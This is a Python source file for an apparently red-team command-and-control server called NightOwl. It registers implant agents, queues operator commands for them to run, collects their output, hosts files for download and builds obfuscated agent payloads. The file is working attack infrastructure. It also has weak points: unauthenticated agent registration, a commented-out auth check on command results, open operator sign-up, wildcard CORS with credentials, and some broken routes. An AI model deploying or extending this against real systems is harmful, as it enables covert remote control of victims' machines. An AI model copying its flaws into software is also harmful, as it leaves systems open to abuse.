#!/usr/bin/env python3
"""
NightOwl C2 Server - Command and Control Server

This server handles agent connections, command routing,
and activity logging for authorized Red Team tests.
"""

import asyncio
import ssl
import logging
import uuid
import base64
from pathlib import Path
from typing import Dict, List

from aiohttp import web, ClientSession
import aiohttp_cors
from cryptography import x509
from cryptography.hazmat.primitives import serialization

from .session_manager import SessionManager
from .command_handler import CommandHandler
from .database import Database
from .security import SecurityManager
from .builder import AgentBuilder


class NightOwlServer:
    def __init__(self, config: Dict):
        self.config = config
        self.logger = logging.getLogger("nightowl.server")
        
        # Component initialization
        self.db = Database(config['database'])
        self.security = SecurityManager(config['security'])
        self.sessions = SessionManager(self.db)
        self.command_handler = CommandHandler(self.sessions, self.db)
        self.builder = AgentBuilder(str(Path(__file__).parent.parent))
        
        self.app = web.Application()
        self.setup_routes()
        
    def setup_routes(self):
        """Configure API HTTP routes"""
        
        # Agent endpoints
        self.app.router.add_post('/api/agent/register', self.handle_agent_register)
        self.app.router.add_post('/api/agent/beacon', self.handle_agent_beacon)
        self.app.router.add_post('/api/agent/command', self.handle_agent_command)
        
        # Operator endpoints
        self.app.router.add_post('/api/operator/auth', self.handle_operator_auth)
        self.app.router.add_post('/api/operator/register', self.handle_operator_register)
        self.app.router.add_post('/api/operator/change-password', self.handle_change_password)
        self.app.router.add_get('/api/sessions', self.handle_get_sessions)
        self.app.router.add_post('/api/command', self.handle_operator_command)
        self.app.router.add_get('/api/command/{command_id}', self.handle_get_command_result)
        self.app.router.add_get('/api/commands', self.handle_get_commands)
        self.app.router.add_post('/api/builder/generate', self.handle_builder_generate)
        
        # File Upload Endpoint
        self.app.router.add_post('/api/files/upload', self.handle_file_upload)
        
        # Administration endpoints
        self.app.router.get('/api/system/status', self.handle_system_status)
        self.app.router.get('/api/logs', self.handle_get_logs)
        
        # Serve web interface (Dashboard)
        web_path = Path(__file__).parent.parent / 'web'
        uploads_path = Path(__file__).parent.parent / 'uploads'
        uploads_path.mkdir(exist_ok=True)
        self.uploads_path = uploads_path

        if web_path.exists():
            # Explicit root route for index.html
            self.app.router.add_get('/', self.handle_index)
            self.app.router.add_get('/index.html', self.handle_index)
            
            # Serve uploads
            self.app.router.add_static('/uploads', str(uploads_path), show_index=True)

            # Serve static files (without directory listing)
            self.app.router.add_static('/', str(web_path), show_index=False)
            self.logger.info(f"Serving web dashboard from {web_path}")
        else:
            self.logger.warning(f"Web directory not found at {web_path}")
        
        # CORS Configuration
        cors = aiohttp_cors.setup(self.app, defaults={
            "*": aiohttp_cors.ResourceOptions(
                allow_credentials=True,
                expose_headers="*",
                allow_headers="*",
            )
        })
        
        for route in list(self.app.router.routes()):
            cors.add(route)
    
    async def handle_agent_register(self, request: web.Request) -> web.Response:
        """New agent registration"""
        try:
            data = await request.json()
            
            # Simplified registration (no signature verification for tests)
            agent_id = data.get('agent_id', str(uuid.uuid4()))
            session_id = self.sessions.create_session(
                agent_id, 
                data, 
                ip_address=request.remote
            )
            
            self.logger.info(f"Agent registered: {agent_id} (Session: {session_id})")
            
            return web.json_response({
                "status": "success",
                "agent_id": agent_id,
                "session_id": session_id,
                "config": self.config['client']
            })
            
        except Exception as e:
            self.logger.error(f"Agent registration failed: {e}")
            return web.json_response({"error": "Registration failed"}, status=500)
    
    async def handle_agent_beacon(self, request: web.Request) -> web.Response:
        """Process agent beacons"""
        try:
            data = await request.json()
            
            # Session verification
            if not self.sessions.validate_session(data['session_id']):
                return web.json_response({"error": "Invalid session"}, status=401)
            
            # Update last activity
            self.sessions.update_activity(data['session_id'])
            
            # Retrieve pending commands
            commands = []
            pending_cmd = self.command_handler.get_pending_command(data['session_id'])
            if pending_cmd:
                commands.append(pending_cmd)
            
            return web.json_response({
                "status": "success",
                "commands": commands,
                "next_beacon": self.sessions.get_next_beacon_time()
            })
            
        except Exception as e:
            self.logger.error(f"Beacon handling failed: {e}", exc_info=True)
            return web.json_response({"error": "Beacon failed"}, status=500)
    
    async def handle_operator_command(self, request: web.Request) -> web.Response:
        """Traitement des commandes opérateurs"""
        try:
            data = await request.json()
            
            # Vérification authentification
            if not await self.security.authenticate_operator(request):
                return web.json_response({"error": "Unauthorized"}, status=401)
            
            # Injecter l'opérateur depuis le token
            auth_header = request.headers.get('Authorization')
            if auth_header:
                token = auth_header.split()[1]
                payload = self.security.verify_jwt_token(token)
                if payload:
                    data['operator'] = payload.get('username', 'unknown')
            
            # Exécution commande
            result = await self.command_handler.handle_operator_command(data)
            
            # Journalisation
            await self.db.log_operator_action(
                data['operator'],
                data['command'],
                data.get('target'),
                result
            )
            
            return web.json_response(result)
            
        except Exception as e:
            self.logger.error(f"Operator command failed: {e}")
            return web.json_response({"error": "Command failed"}, status=500)
    
    async def handle_get_command_result(self, request: web.Request) -> web.Response:
        """Récupère le résultat d'une commande"""
        try:
            command_id = request.match_info['command_id']
            
            # Vérification authentification (TODO)
            # if not await self.security.authenticate_operator(request):
            #    return web.json_response({"error": "Unauthorized"}, status=401)
            
            command_data = self.command_handler.get_command_status(command_id)
            
            if not command_data:
                return web.json_response({"error": "Command not found"}, status=404)
                
            return web.json_response(command_data)
            
        except Exception as e:
            self.logger.error(f"Failed to get command result: {e}")
            return web.json_response({"error": "Failed to get result"}, status=500)

    # Méthodes de gestion des requêtes...
    async def handle_agent_command(self, request: web.Request) -> web.Response:
        """Réception des résultats de commandes agents"""
        try:
            data = await request.json()
            
            # Validation de la session (optionnel, déjà fait par le token si implémenté)
            if 'session_id' in data and not self.sessions.validate_session(data['session_id']):
                # On pourrait rejeter, mais on accepte les résultats même si la session a expiré récemment
                self.logger.warning(f"Receiving results for expired session: {data.get('session_id')}")
            
            results = data.get('results', [])
            processed_count = 0
            
            for result in results:
                command_id = result.get('command_id')
                if command_id:
                    # Mettre à jour le statut de la commande
                    success = await self.command_handler.process_command_result(command_id, result)
                    if success:
                        processed_count += 1
                        
                        # Logger le résultat dans la DB
                        if result.get('status') == 'success':
                            self.logger.info(f"Command {command_id} success: {result.get('result', {}).get('stdout', '')[:50]}...")
                        else:
                            self.logger.warning(f"Command {command_id} failed: {result.get('result', '')}")

            return web.json_response({
                "status": "success",
                "processed": processed_count
            })
            
        except Exception as e:
            self.logger.error(f"Failed to handle agent command results: {e}")
            return web.json_response({"error": "Failed to process results"}, status=500)
    
    async def handle_operator_auth(self, request: web.Request) -> web.Response:
        """Authentification opérateur"""
        try:
            data = await request.json()
            username = data.get('username')
            password = data.get('password')
            
            if not username or not password:
                return web.json_response({"error": "Missing credentials"}, status=400)
            
            auth_result = self.security.validate_operator_credentials(username, password, self.db)
            if auth_result["authenticated"]:
                # Generate token
                operator = self.db.get_operator_by_username(username)
                token = self.security.create_jwt_token({
                    'username': username,
                    'role': operator['role'],
                    'type': 'operator'
                })
                
                return web.json_response({
                    "status": "success",
                    "token": token,
                    "username": username,
                    "role": operator['role'],
                    "password_changed": auth_result["password_changed"]
                })
            else:
                return web.json_response({"error": "Invalid credentials"}, status=401)
                
        except Exception as e:
            self.logger.error(f"Auth failed: {e}")
            return web.json_response({"error": "Authentication failed"}, status=500)

    async def handle_operator_register(self, request: web.Request) -> web.Response:
        """New operator registration"""
        try:
            data = await request.json()
            username = data.get('username')
            password = data.get('password')
            
            if not username or not password:
                return web.json_response({"error": "Missing credentials"}, status=400)
            
            if self.db.get_operator_by_username(username):
                return web.json_response({"error": "Username already exists"}, status=409)
            
            password_hash = self.security.hash_password(password)
            if self.db.create_operator(username, password_hash):
                return web.json_response({"status": "success", "message": "User created"})
            else:
                return web.json_response({"error": "Failed to create user"}, status=500)
                
        except Exception as e:
            self.logger.error(f"Registration failed: {e}")
            return web.json_response({"error": "Registration failed"}, status=500)

    async def handle_change_password(self, request: web.Request) -> web.Response:
        """Changement de mot de passe obligatoire"""
        try:
            # Vérification de l'authentification
            if not await self.security.authenticate_operator(request):
                return web.json_response({"error": "Unauthorized"}, status=401)
            
            data = await request.json()
            current_password = data.get('current_password')
            new_password = data.get('new_password')
            
            if not current_password or not new_password:
                return web.json_response({"error": "Missing password fields"}, status=400)
            
            # Récupérer l'opérateur depuis le token
            auth_header = request.headers.get('Authorization')
            if not auth_header:
                return web.json_response({"error": "Missing authorization"}, status=401)
                
            token = auth_header.split()[1]
            payload = self.security.verify_jwt_token(token)
            if not payload:
                return web.json_response({"error": "Invalid token"}, status=401)
            
            username = payload.get('username')
            
            # Vérifier le mot de passe actuel
            auth_result = self.security.validate_operator_credentials(username, current_password, self.db)
            if not auth_result["authenticated"]:
                return web.json_response({"error": "Current password is incorrect"}, status=401)
            
            # Valider la complexité du nouveau mot de passe
            complexity_check = self.security.validate_password_complexity(new_password)
            if not complexity_check["valid"]:
                return web.json_response({
                    "error": "Password complexity requirements not met",
                    "details": complexity_check["errors"]
                }, status=400)
            
            # Hacher le nouveau mot de passe
            new_password_hash = self.security.hash_password(new_password)
            
            # Mettre à jour le mot de passe
            if self.db.update_operator_password(username, new_password_hash):
                self.logger.info(f"Password changed successfully for operator: {username}")
                return web.json_response({
                    "status": "success",
                    "message": "Password changed successfully"
                })
            else:
                return web.json_response({"error": "Failed to update password"}, status=500)
                
        except Exception as e:
            self.logger.error(f"Password change failed: {e}")
            return web.json_response({"error": "Password change failed"}, status=500)
    
    async def handle_get_sessions(self, request: web.Request) -> web.Response:
        """List sessions (active and inactive)"""
        # Authentication verification
        if not await self.security.authenticate_operator(request):
            return web.json_response({"error": "Unauthorized"}, status=401)

        try:
            # Retrieve all sessions via session manager
            sessions_data = []
            
            for session_info in self.sessions.get_all_sessions():
                sessions_data.append({
                    'id': session_info['id'],
                    'agent_id': session_info.get('agent_id', ''),
                    'hostname': session_info.get('hostname', 'Unknown'),
                    'ip_address': session_info.get('ip_address', 'Unknown'),
                    'status': session_info.get('status', 'unknown'),
                    'created_at': session_info.get('created_at', ''),
                    'last_activity': session_info.get('last_activity', 0),
                    'last_seen': session_info.get('last_seen', ''),
                    'is_online': session_info.get('is_online', False),
                    'cpu_percent': 0,  # These data will be updated during beacons
                    'memory_percent': 0
                })
            
            self.logger.info(f"Returning {len(sessions_data)} sessions (active and inactive)")
            
            return web.json_response({
                'status': 'success',
                'sessions': sessions_data,
                'count': len(sessions_data)
            })
            
        except Exception as e:
            self.logger.error(f"Failed to get sessions: {e}")
            return web.json_response({
                'status': 'error',
                'error': str(e)
            }, status=500)
    
    async def handle_system_status(self, request: web.Request) -> web.Response:
        """System status"""
        pass
    
    async def handle_get_logs(self, request: web.Request) -> web.Response:
        """Retrieve system logs"""
        # TODO: Implement real logs reading
        return web.json_response({
            "logs": [
                {"timestamp": "2024-03-20T10:00:00", "level": "INFO", "message": "Server started"},
                {"timestamp": "2024-03-20T10:01:00", "level": "INFO", "message": "Agent connected"}
            ]
        })

    async def handle_get_commands(self, request: web.Request) -> web.Response:
        """Retrieve command history"""
        if not await self.security.authenticate_operator(request):
            return web.json_response({"error": "Unauthorized"}, status=401)
        
        try:
            limit = int(request.query.get('limit', 100))
            agent_id = request.query.get('agent_id')
            commands = self.db.get_commands(limit, agent_id)
            return web.json_response({"status": "success", "commands": commands})
        except Exception as e:
            self.logger.error(f"Failed to get commands: {e}")
            return web.json_response({"error": str(e)}, status=500)

    async def handle_builder_generate(self, request: web.Request) -> web.Response:
        """Handle agent generation asynchronously to avoid blocking the server"""
        if not await self.security.authenticate_operator(request):
            return web.json_response({"error": "Unauthorized"}, status=401)
            
        try:
            data = await request.json()
            config = data.get('config', {})
            format_type = data.get('format', 'source')
            obfuscation = data.get('obfuscation', 'none')
            
            self.logger.info(f"Starting agent generation: format={format_type}, obfuscation={obfuscation}")
            
            # Execute generation (CPU/IO heavy) in a separate thread
            loop = asyncio.get_event_loop()
            content, filename = await loop.run_in_executor(
                None, 
                self.builder.generate_agent, 
                config, 
                format_type, 
                obfuscation
            )
            
            self.logger.info(f"Agent generated successfully: {filename} ({len(content)} bytes)")
            
            return web.json_response({
                "status": "success",
                "filename": filename,
                "content_b64": base64.b64encode(content).decode('utf-8')
            })
        except Exception as e:
            self.logger.error(f"Build failed: {e}", exc_info=True)
            return web.json_response({"error": str(e)}, status=500)

    async def handle_file_upload(self, request: web.Request) -> web.Response:
        """Handle file upload to server (from dashboard)"""
        if not await self.security.authenticate_operator(request):
            return web.json_response({"error": "Unauthorized"}, status=401)

        try:
            reader = await request.multipart()
            field = await reader.next()
            if field.name != 'file':
                return web.json_response({"error": "No file field"}, status=400)
            
            filename = field.filename
            if not filename:
                filename = f"upload_{uuid.uuid4()}.bin"
                
            # Secure filename
            filename = Path(filename).name
            file_path = self.uploads_path / filename
            
            with open(file_path, 'wb') as f:
                while True:
                    chunk = await field.read_chunk()
                    if not chunk:
                        break
                    f.write(chunk)
            
            # Relative URL for public access (static)
            # Note: In a real C2, URL would depend on Host header or config
            host = request.headers.get('Host', 'localhost:8443')
            # Use the static route /uploads defined in setup_routes
            url = f"/uploads/{filename}"
            
            return web.json_response({
                "status": "success",
                "filename": filename,
                "url": url
            })
            
        except Exception as e:
            self.logger.error(f"File upload failed: {e}")
            return web.json_response({"error": str(e)}, status=500)
            
    async def handle_index(self, request: web.Request) -> web.Response:
        """Serves home page"""
        web_path = Path(__file__).parent.parent / 'web' / 'index.html'
        return web.FileResponse(web_path)

    def create_ssl_context(self) -> ssl.SSLContext:
        """Creates SSL context for the server"""
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        
        if self.config['server']['ssl_enabled']:
            ssl_context.load_cert_chain(
                certfile=self.config['server']['ssl_cert'],
                keyfile=self.config['server']['ssl_key']
            )
            
            # Secure TLS configuration
            ssl_context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
            ssl_context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
            ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
        
        return ssl_context
    
    async def start(self):
        """Server startup"""
        ssl_context = self.create_ssl_context()
        
        # Database initialization (already done in __init__)
        
        # Start server
        runner = web.AppRunner(self.app)
        await runner.setup()
        
        site = web.TCPSite(
            runner,
            host=self.config['server']['host'],
            port=self.config['server']['port'],
            ssl_context=ssl_context
        )
        
        await site.start()
        self.logger.info(f"Server started on {self.config['server']['host']}:{self.config['server']['port']}")
        
        # Boucle principale
        try:
            await asyncio.Future()  # Run forever
        except KeyboardInterrupt:
            self.logger.info("Server shutting down...")
        finally:
            await runner.cleanup()
            await self.db.close()


def main():
    """Point d'entrée principal du serveur"""
    import yaml
    
    # Configuration logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('logs/nightowl_server.log'),
            logging.StreamHandler()
        ]
    )
    
    # Chargement configuration
    try:
        with open('config.yaml', 'r') as f:
            config = yaml.safe_load(f)
    except FileNotFoundError:
        print("Configuration file not found. Please create config.yaml from config.example.yaml")
        return
    
    # Démarrage serveur
    server = NightOwlServer(config)
    
    try:
        asyncio.run(server.start())
    except Exception as e:
        logging.error(f"Server failed to start: {e}")
        raise


if __name__ == "__main__":
    main()